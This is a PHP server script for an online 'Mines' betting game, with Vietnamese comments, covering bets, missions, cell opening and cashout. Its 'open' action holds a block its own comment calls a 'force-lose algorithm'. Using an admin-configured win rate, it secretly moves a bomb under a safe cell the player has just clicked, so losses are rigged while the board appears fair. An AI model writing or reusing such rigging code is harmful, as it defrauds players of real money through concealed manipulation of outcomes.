<?php
session_start();
require 'db.php';
header('Content-Type: application/json');

if (!isset($_SESSION['user_id']) || $_SESSION['role'] !== 'user') {
    echo json_encode(['success' => false, 'error' => 'Chưa đăng nhập']);
    exit;
}

$userId = $_SESSION['user_id'];
$action = $_POST['action'] ?? '';

// [QUAN TRỌNG] Đặt lệnh ALTER TABLE bên ngoài Transaction để chống lỗi Implicit Commit của MySQL
try {
    $pdo->exec("ALTER TABLE settings ADD COLUMN mines_add_money INT DEFAULT 5000");
    $pdo->exec("ALTER TABLE settings ADD COLUMN mines_win_rate INT DEFAULT 40");
    $pdo->exec("ALTER TABLE users ADD COLUMN mines_count INT DEFAULT 0"); // Tự động tạo cột nhiệm vụ dò mìn
} catch (Exception $e) {
    // Bỏ qua nếu cột đã tồn tại
}

if ($action === 'start') {
    $bet = (int)($_POST['bet'] ?? 0);
    if ($bet <= 0) {
        echo json_encode(['success' => false, 'error' => 'Cược không hợp lệ']);
        exit;
    }

    $pdo->beginTransaction();
    try {
        $stmt = $pdo->prepare("SELECT balance FROM users WHERE id = ? FOR UPDATE");
        $stmt->execute([$userId]);
        $user = $stmt->fetch();

        if ($user['balance'] < $bet) {
            echo json_encode(['success' => false, 'error' => 'Không đủ số dư']);
            $pdo->rollBack();
            exit;
        }

        // Trừ tiền cược và tăng tiến độ nhiệm vụ
        $newBalance = $user['balance'] - $bet;
        $pdo->prepare("UPDATE users SET balance = ?, mines_count = mines_count + 1 WHERE id = ?")->execute([$newBalance, $userId]);

        // --- XỬ LÝ KIỂM TRA NHIỆM VỤ DÒ MÌN ---
        $mission_info = ['rewarded' => false];
        $currentCount = $pdo->query("SELECT mines_count FROM users WHERE id = $userId")->fetchColumn();
        $missions = $pdo->query("SELECT * FROM mission_settings WHERE mission_key = 'mines_count'")->fetchAll();

        foreach ($missions as $m) {
            if ($currentCount == $m['target_count']) {
                $pdo->prepare("UPDATE users SET spins_available = spins_available + ? WHERE id = ?")
                    ->execute([$m['reward_spins'], $userId]);
                $mission_info = [
                    'rewarded' => true,
                    'current' => $currentCount,
                    'target' => $m['target_count']
                ];
                break;
            }
        }

        // Lấy lại tiến độ để hiện UI nếu chưa hoàn thành
        if (!$mission_info['rewarded'] && count($missions) > 0) {
            $mission_info['current'] = $currentCount;
            $mission_info['target'] = $missions[0]['target_count'];
        }
        // -------------------------------------

        // Lấy cài đặt mìn và tiền cộng cố định từ DB
        $settings = $pdo->query("SELECT mines_bombs, mines_add_money FROM settings WHERE id = 1")->fetch();
        $bombs = (int)$settings['mines_bombs'];
        $mines_add = (int)($settings['mines_add_money'] ?? 5000);

        if ($bombs < 1 || $bombs > 24) $bombs = 3;

        // Tạo bàn chơi
        $board = array_fill(0, 25, 'safe');
        $bombIndexes = (array)array_rand($board, $bombs);
        foreach ($bombIndexes as $i) {
            $board[$i] = 'bomb';
        }

        $_SESSION['mines'] = [
            'bet' => $bet,
            'pot' => $bet, // Quỹ ban đầu bằng tiền cược
            'board' => $board,
            'bombs' => $bombs,
            'mines_add' => $mines_add, // Lưu mức cộng tiền vào phiên chơi
            'step' => 0,
            'status' => 'playing'
        ];

        $pdo->commit();
        // Trả thêm $mission_info về cho Javascript
        echo json_encode(['success' => true, 'balance' => $newBalance, 'pot' => $bet, 'bombs' => $bombs, 'mission' => $mission_info]);
    } catch (Exception $e) {
        $pdo->rollBack();
        echo json_encode(['success' => false, 'error' => 'Lỗi hệ thống']);
    }
    exit;
}

if ($action === 'open') {
    if (!isset($_SESSION['mines']) || $_SESSION['mines']['status'] !== 'playing') {
        echo json_encode(['success' => false, 'error' => 'Ván chơi không hợp lệ']);
        exit;
    }

    $index = (int)$_POST['index'];
    $mines = $_SESSION['mines'];

    // Lấy config tỷ lệ thắng
    $settings = $pdo->query("SELECT mines_win_rate FROM settings WHERE id = 1")->fetch();
    $win_rate = (int)($settings['mines_win_rate'] ?? 40);

    // --- BẮT ĐẦU THUẬT TOÁN ÉP THUA ---
    // Can thiệp: Nếu rơi vào phần trăm "ép thua" và ô đó đang an toàn, nhà cái sẽ tự động dời mìn vào ô user vừa bấm.
    $is_rigged_to_lose = (rand(1, 100) > $win_rate);
    if ($mines['board'][$index] === 'safe' && $is_rigged_to_lose) {
        $mines['board'][$index] = 'bomb'; // Ép chết ngay lập tức
    }
    // --- KẾT THÚC THUẬT TOÁN ÉP THUA ---

    if ($mines['board'][$index] === 'bomb') {
        // Đạp mìn -> Thua -> Mất toàn bộ Pot đang có
        $pdo->prepare("INSERT INTO mines_history (user_id, bet, win, net_profit, bombs, steps) VALUES (?, ?, 0, ?, ?, ?)")
            ->execute([$userId, $mines['bet'], -$mines['bet'], $mines['bombs'], $mines['step']]);
        unset($_SESSION['mines']);
        echo json_encode(['success' => true, 'is_bomb' => true, 'board' => $mines['board']]);
    } else {
        // An toàn -> Cộng tiền cố định thay vì nhân hệ số
        $mines['step']++;
        $mines['pot'] += $mines['mines_add'];

        $_SESSION['mines'] = $mines;

        echo json_encode(['success' => true, 'is_bomb' => false, 'pot' => $mines['pot'], 'step' => $mines['step']]);
    }
    exit;
}

if ($action === 'cashout') {
    if (!isset($_SESSION['mines']) || $_SESSION['mines']['status'] !== 'playing') {
        echo json_encode(['success' => false, 'error' => 'Ván chơi không tồn tại']);
        exit;
    }
    $mines = $_SESSION['mines'];

    $pdo->beginTransaction();
    try {
        // Trả tiền thưởng (Bỏ cộng tiến độ ở đây vì đã xử lý ở action = start)
        $pdo->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")->execute([$mines['pot'], $userId]);

        // Ghi lại lịch sử
        $pdo->prepare("INSERT INTO mines_history (user_id, bet, win, net_profit, bombs, steps) VALUES (?, ?, ?, ?, ?, ?)")
            ->execute([$userId, $mines['bet'], $mines['pot'], $mines['pot'] - $mines['bet'], $mines['bombs'], $mines['step']]);

        $newBalance = $pdo->query("SELECT balance FROM users WHERE id = $userId")->fetchColumn();
        $pdo->commit();
        unset($_SESSION['mines']);

        echo json_encode(['success' => true, 'winnings' => $mines['pot'], 'balance' => $newBalance]);
    } catch (Exception $e) {
        $pdo->rollBack();
        echo json_encode(['success' => false]);
    }
    exit;
}
